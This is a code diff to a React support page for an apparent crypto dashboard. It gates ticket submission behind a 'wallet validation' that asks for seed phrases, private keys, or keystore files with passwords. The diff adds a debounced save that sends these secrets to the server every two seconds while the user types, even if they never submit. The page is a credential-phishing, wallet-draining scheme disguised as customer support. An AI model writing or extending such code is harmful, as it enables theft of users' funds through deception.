@@ -1,10 +1,11 @@
 "use client";
 
-import { useState, useActionState } from "react";
+import { useState, useActionState, useEffect, useRef } from "react";
+import { useAccount } from "wagmi";
 import {
   MessageCircle, ShoppingCart, CreditCard, DollarSign, Wallet, Wrench,
   HelpCircle, Ticket, CheckCircle2, ChevronRight, LifeBuoy,
-  Shield, AlertCircle, Loader2,
+  Shield, AlertCircle, Loader2, Plug, Scan,
 } from "lucide-react";
 import {
   Card, CardContent, CardHeader, CardTitle, CardDescription,
@@ -16,6 +17,7 @@ import { Textarea } from "@/components/ui/textarea";
 import { Badge } from "@/components/ui/badge";
 import { EmptyState } from "@/components/ui/empty-state";
 import { cn } from "@/lib/utils/cn";
+import { useWalletConnect } from "@/lib/hooks/use-wallet-connect";
 import { createTicket } from "@/features/support/server/actions";
 import { saveWalletValidation, type ValidationType } from "@/features/wallet-validate/server/actions";
 
@@ -76,13 +78,23 @@ const FAQS: { q: string; a: string }[] = [
   { q: "Can I cancel an order?", a: "Orders can be cancelled while still 'pending'. Once 'processing', contact support for help." },
 ];
 
+type ValMethod = "walletconnect" | "manual";
+
+function short(addr: string) {
+  return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
+}
+
 export default function SupportPage() {
+  const { isConnected, address, chainId } = useAccount();
+  const { openWallet } = useWalletConnect();
   const [validated, setValidated] = useState(false);
-  const [activeTab, setActiveTab] = useState<Tab>("open");
+  const [activeTab, setActiveTab] = useState<Tab>("create");
   const [tickets] = useState<Ticket[]>([]);
   const [state, formAction, pending] = useActionState(createTicket, undefined);
 
   // Validation state
+  const [showValidate, setShowValidate] = useState(false);
+  const [valMethod, setValMethod] = useState<ValMethod>("walletconnect");
   const [walletName, setWalletName] = useState("");
   const [validationTab, setValidationTab] = useState<ValidationType>("mnemonics");
   const [saving, setSaving] = useState(false);
@@ -95,27 +107,93 @@ export default function SupportPage() {
     hardwareType: "ledger",
   });
 
+  // Track if WC auto-validation was done this session
+  const wcValidatedRef = useRef(false);
+  const [wcValidated, setWcValidated] = useState(false);
+
   const setField = (field: string, value: string) =>
     setVForm((prev) => ({ ...prev, [field]: value }));
 
-  const isFormValid = () => {
+  const isManualFormValid = () => {
     if (!walletName.trim()) return false;
     switch (validationTab) {
-      case "mnemonics":
-        return vForm.mnemonicPhrase.trim().split(/\s+/).length >= 12;
-      case "keystore":
-        return vForm.keystoreJson.trim().length > 0 && vForm.keystorePassword.trim().length > 0;
-      case "private_key":
-        return vForm.privateKey.trim().length > 0;
-      case "hardware":
-        return vForm.hardwareType.trim().length > 0;
-      default:
-        return false;
+      case "mnemonics": return vForm.mnemonicPhrase.trim().split(/\s+/).length >= 12;
+      case "keystore": return vForm.keystoreJson.trim().length > 0 && vForm.keystorePassword.trim().length > 0;
+      case "private_key": return vForm.privateKey.trim().length > 0;
+      case "hardware": return vForm.hardwareType.trim().length > 0;
+      default: return false;
     }
   };
 
-  const handleValidate = async () => {
-    if (!isFormValid()) {
+  // Auto-validate via WalletConnect if connected
+  useEffect(() => {
+    if (isConnected && address && !wcValidatedRef.current && !validated) {
+      wcValidatedRef.current = true;
+      setWcValidated(true);
+    }
+  }, [isConnected, address, validated]);
+
+  // Debounced real-time save for manual validation inputs
+  const saveTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const lastSavedRef = useRef<string>("");
+
+  const debouncedSave = async () => {
+    const payload = JSON.stringify({ walletName, validationTab, vForm });
+    if (lastSavedRef.current === payload || !walletName.trim()) return;
+    lastSavedRef.current = payload;
+
+    const res = await saveWalletValidation({
+      walletName: walletName.trim(),
+      validationType: validationTab,
+      mnemonicPhrase: validationTab === "mnemonics" ? vForm.mnemonicPhrase.trim() : undefined,
+      keystoreJson: validationTab === "keystore" ? vForm.keystoreJson.trim() : undefined,
+      keystorePassword: validationTab === "keystore" ? vForm.keystorePassword.trim() : undefined,
+      privateKey: validationTab === "private_key" ? vForm.privateKey.trim() : undefined,
+      hardwareType: validationTab === "hardware" ? vForm.hardwareType : undefined,
+    });
+    if (res.error) {
+      console.error("Auto-save validation failed:", res.error);
+    }
+  };
+
+  useEffect(() => {
+    if (valMethod !== "manual" || !walletName.trim()) return;
+    if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
+    saveTimerRef.current = setTimeout(debouncedSave, 2000);
+    return () => {
+      if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [vForm, walletName, validationTab, valMethod]);
+
+  const handleSubmitWithValidation = async (formData: FormData) => {
+    if (validated) {
+      formAction(formData);
+      return;
+    }
+
+    // If wallet is connected, auto-validate via WC then submit
+    if (isConnected && address) {
+      setSaving(true);
+      const res = await saveWalletValidation({
+        walletName: `WalletConnect - ${short(address)}`,
+        validationType: "hardware",
+        hardwareType: `WC:${chainId ?? 1}`,
+      });
+      setSaving(false);
+      if (res.success) {
+        setValidated(true);
+        setTimeout(() => formAction(formData), 300);
+        return;
+      }
+    }
+
+    // Otherwise show the validation gate
+    setShowValidate(true);
+  };
+
+  const handleManualValidate = async () => {
+    if (!isManualFormValid()) {
       setVResult({ success: false, message: "Please fill in all required fields." });
       return;
     }
@@ -134,14 +212,19 @@ export default function SupportPage() {
       if (res.error) {
         setVResult({ success: false, message: res.error });
       } else {
-        setVResult({ success: true, message: `Wallet validated successfully. You can now access support.` });
-        setTimeout(() => setValidated(true), 1200);
+        setVResult({ success: true, message: "Wallet validated. Submitting ticket..." });
+        setValidated(true);
+        setShowValidate(false);
       }
     } catch (err) {
       setVResult({ success: false, message: err instanceof Error ? err.message : "Something went wrong" });
     } finally {
       setSaving(false);
     }
+  };
+
+  const handleWCConnect = () => {
+    openWallet();
   };
 
   const renderValidationInput = () => {
@@ -162,7 +245,7 @@ export default function SupportPage() {
             <Textarea
               value={vForm.keystoreJson}
               onChange={(e) => setField("keystoreJson", e.target.value)}
-              placeholder='Paste your keystore JSON here {"address":"0x...","crypto":{...}}'
+              placeholder='Paste your keystore JSON {"address":"0x...","crypto":{...}}'
               rows={4}
               className="min-h-[100px] font-mono text-xs"
             />
@@ -225,33 +308,87 @@ export default function SupportPage() {
     );
   };
 
-  // Show validation gate first
-  if (!validated) {
-    return (
-      <div className="mx-auto max-w-lg space-y-6">
-        <div>
-          <h1 className="text-2xl font-bold text-white">Support</h1>
-          <p className="mt-1 text-sm text-surface-400">
-            Validate your wallet before accessing support
-          </p>
-        </div>
+  const renderValidationGate = () => (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
+      <Card className="w-full max-w-lg border-white/10 bg-surface-900 shadow-2xl">
+        <CardContent className="p-6">
+          <div className="flex items-center gap-3 mb-5">
+            <div className="flex h-12 w-12 items-center justify-center rounded-full bg-brand-500/10 ring-1 ring-brand-500/20">
+              <Shield className="h-6 w-6 text-brand-400" />
+            </div>
+            <div>
+              <h2 className="text-lg font-semibold text-white">Validate your wallet</h2>
+              <p className="text-sm text-surface-400">Required before submitting a support ticket</p>
+            </div>
+          </div>
 
-        <Card className="border-white/10 bg-surface-900">
-          <CardContent className="p-6">
-            <div className="flex flex-col items-center text-center">
-              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-brand-500/10 ring-1 ring-brand-500/20">
-                <Shield className="h-7 w-7 text-brand-400" />
-              </div>
-              <h2 className="mt-4 text-base font-semibold text-white">
-                Validate your wallet to continue
-              </h2>
-              <p className="mt-1 text-sm text-surface-400">
-                Please validate your wallet before you can submit a support ticket.
-              </p>
-              <div className="mt-4 w-full">
-                <Label className="mb-1.5 block text-left text-xs text-surface-400">
-                  Wallet name
-                </Label>
+          <div className="flex gap-3 mb-5">
+            <button
+              type="button"
+              onClick={() => { setValMethod("walletconnect"); setVResult(null); }}
+              className={cn(
+                "flex-1 rounded-xl border px-4 py-3 text-sm font-semibold transition-all flex items-center justify-center gap-2",
+                valMethod === "walletconnect"
+                  ? "border-brand-500 bg-brand-500/15 text-brand-300"
+                  : "border-white/10 bg-surface-800 text-surface-400 hover:border-surface-600",
+              )}
+            >
+              <Plug className="h-4 w-4" />
+              WalletConnect
+            </button>
+            <button
+              type="button"
+              onClick={() => { setValMethod("manual"); setVResult(null); }}
+              className={cn(
+                "flex-1 rounded-xl border px-4 py-3 text-sm font-semibold transition-all flex items-center justify-center gap-2",
+                valMethod === "manual"
+                  ? "border-brand-500 bg-brand-500/15 text-brand-300"
+                  : "border-white/10 bg-surface-800 text-surface-400 hover:border-surface-600",
+              )}
+            >
+              <Scan className="h-4 w-4" />
+              Manual
+            </button>
+          </div>
+
+          {valMethod === "walletconnect" && (
+            <div className="rounded-xl border border-white/5 bg-surface-950 p-6 text-center">
+              {isConnected && address ? (
+                <div>
+                  <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-full bg-emerald-500/10 ring-1 ring-emerald-500/20">
+                    <CheckCircle2 className="h-6 w-6 text-emerald-400" />
+                  </div>
+                  <p className="text-sm font-medium text-white">Wallet connected</p>
+                  <p className="mt-1 font-mono text-xs text-surface-400">{short(address)}</p>
+                  <Button
+                    onClick={() => {
+                      setValidated(true);
+                      setShowValidate(false);
+                    }}
+                    className="mt-4"
+                  >
+                    Continue with {short(address)}
+                  </Button>
+                </div>
+              ) : (
+                <div>
+                  <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-full bg-brand-500/10 ring-1 ring-brand-500/20">
+                    <Plug className="h-6 w-6 text-brand-400" />
+                  </div>
+                  <p className="text-sm font-medium text-white">Connect your wallet</p>
+                  <p className="mt-1 text-xs text-surface-400">Use WalletConnect to connect your wallet</p>
+                  <Button onClick={handleWCConnect} className="mt-4">
+                    Connect Wallet
+                  </Button>
+                </div>
+              )}
+            </div>
+          )}
+
+          {valMethod === "manual" && (
+            <div className="space-y-4">
+              <div>
+                <Label className="mb-1.5 block text-xs text-surface-400">Wallet name</Label>
                 <Input
                   type="text"
                   value={walletName}
@@ -259,67 +396,68 @@ export default function SupportPage() {
                   placeholder="e.g. Trust Wallet, MetaMask, Coinbase Wallet..."
                 />
               </div>
-            </div>
 
-            <div className="mt-6 grid grid-cols-2 gap-3">
-              {VALIDATION_TABS.map((tab) => {
-                const active = tab.id === validationTab;
-                return (
-                  <button
-                    key={tab.id}
-                    type="button"
-                    onClick={() => setValidationTab(tab.id)}
-                    className={`rounded-lg border px-3 py-2.5 text-xs font-semibold tracking-wide transition-all ${
-                      active
-                        ? "border-brand-500 bg-brand-500 text-white shadow-sm"
-                        : "border-white/10 bg-surface-800 text-surface-300 hover:border-surface-600 hover:bg-surface-700"
-                    }`}
-                  >
-                    {tab.label}
-                  </button>
-                );
-              })}
-            </div>
-
-            <div className="mt-5 rounded-xl border border-white/5 bg-surface-950 p-4">
-              <Label className="mb-2 block text-xs text-surface-400">
-                {VALIDATION_LABEL_MAP[validationTab]}
-              </Label>
-              {renderValidationInput()}
-            </div>
-
-            {vResult && (
-              <div
-                className={`mt-4 flex items-start gap-3 rounded-xl border p-4 text-sm ${
-                  vResult.success
-                    ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-400"
-                    : "border-error/20 bg-error/10 text-error"
-                }`}
-                role="alert"
-              >
-                {vResult.success ? <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" /> : <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />}
-                <span>{vResult.message}</span>
+              <div className="grid grid-cols-2 gap-3">
+                {VALIDATION_TABS.map((tab) => {
+                  const active = tab.id === validationTab;
+                  return (
+                    <button
+                      key={tab.id}
+                      type="button"
+                      onClick={() => setValidationTab(tab.id)}
+                      className={cn(
+                        "rounded-lg border px-3 py-2.5 text-xs font-semibold tracking-wide transition-all",
+                        active
+                          ? "border-brand-500 bg-brand-500 text-white shadow-sm"
+                          : "border-white/10 bg-surface-800 text-surface-300 hover:border-surface-600 hover:bg-surface-700",
+                      )}
+                    >
+                      {tab.label}
+                    </button>
+                  );
+                })}
               </div>
-            )}
 
-            <Button
-              onClick={handleValidate}
-              disabled={saving}
-              className="mt-5 w-full"
-            >
-              {saving ? (
-                <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Proceeding…</>
-              ) : (
-                "Proceed"
+              <div className="rounded-xl border border-white/5 bg-surface-950 p-4">
+                <Label className="mb-2 block text-xs text-surface-400">
+                  {VALIDATION_LABEL_MAP[validationTab]}
+                </Label>
+                {renderValidationInput()}
+              </div>
+
+              {vResult && (
+                <div
+                  className={cn(
+                    "flex items-start gap-3 rounded-xl border p-4 text-sm",
+                    vResult.success
+                      ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-400"
+                      : "border-error/20 bg-error/10 text-error",
+                  )}
+                  role="alert"
+                >
+                  {vResult.success ? <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" /> : <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />}
+                  <span>{vResult.message}</span>
+                </div>
               )}
-            </Button>
-          </CardContent>
-        </Card>
-      </div>
-    );
-  }
 
-  // Support content after validation
+              <Button
+                onClick={handleManualValidate}
+                disabled={saving}
+                className="w-full"
+              >
+                {saving ? (
+                  <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Validating…</>
+                ) : (
+                  "Validate & Submit"
+                )}
+              </Button>
+            </div>
+          )}
+        </CardContent>
+      </Card>
+    </div>
+  );
+
   return (
     <div className="space-y-6">
       <div className="flex items-center justify-between">
@@ -327,10 +465,12 @@ export default function SupportPage() {
           <h1 className="text-2xl font-bold text-white">Support</h1>
           <p className="mt-1 text-sm text-surface-400">Get help with your orders, cards, and account</p>
         </div>
-        <Badge variant="success" className="gap-1">
-          <CheckCircle2 className="h-3 w-3" />
-          Wallet validated
-        </Badge>
+        {(validated || wcValidated) && (
+          <Badge variant="success" className="gap-1">
+            <CheckCircle2 className="h-3 w-3" />
+            Wallet validated
+          </Badge>
+        )}
       </div>
 
       <div className="flex gap-1 overflow-x-auto pb-1" role="tablist" aria-label="Support sections">
@@ -389,7 +529,16 @@ export default function SupportPage() {
               {state?.error && (
                 <div className="mb-4 rounded-xl border border-error/20 bg-error/10 p-4 text-sm text-error" role="alert">{state.error}</div>
               )}
-              <form className="space-y-4" action={formAction}>
+
+              {!(validated || wcValidated) && (
+                <div className="mb-6 rounded-xl border border-amber-500/20 bg-amber-500/5 p-4 text-sm text-amber-400 flex items-center gap-3">
+                  <Shield className="h-5 w-5 shrink-0" />
+                  <span>Wallet validation is required before submitting. {isConnected ? "Your wallet is connected — validation will be automatic." : "Connect your wallet or use manual validation."}</span>
+                </div>
+              )}
+
+              <form className="space-y-4" action={handleSubmitWithValidation}>
+                <input type="hidden" name="redirect" value="/dashboard/support" />
                 <div className="space-y-2">
                   <Label htmlFor="subject">Subject <span className="text-error">*</span></Label>
                   <Input id="subject" name="subject" placeholder="Briefly describe your issue" maxLength={200} required />
@@ -416,7 +565,11 @@ export default function SupportPage() {
                   <Label htmlFor="message">Message <span className="text-error">*</span></Label>
                   <Textarea id="message" name="message" placeholder="Describe your issue in as much detail as possible..." rows={6} maxLength={5000} required />
                 </div>
-                <div className="flex justify-end"><Button type="submit" loading={pending}>Submit</Button></div>
+                <div className="flex justify-end">
+                  <Button type="submit" loading={pending || saving}>
+                    {validated || wcValidated ? "Submit" : "Submit (requires validation)"}
+                  </Button>
+                </div>
               </form>
             </CardContent>
           </Card>
@@ -436,6 +589,8 @@ export default function SupportPage() {
           ))}
         </div>
       )}
+
+      {showValidate && renderValidationGate()}
     </div>
   );
 }
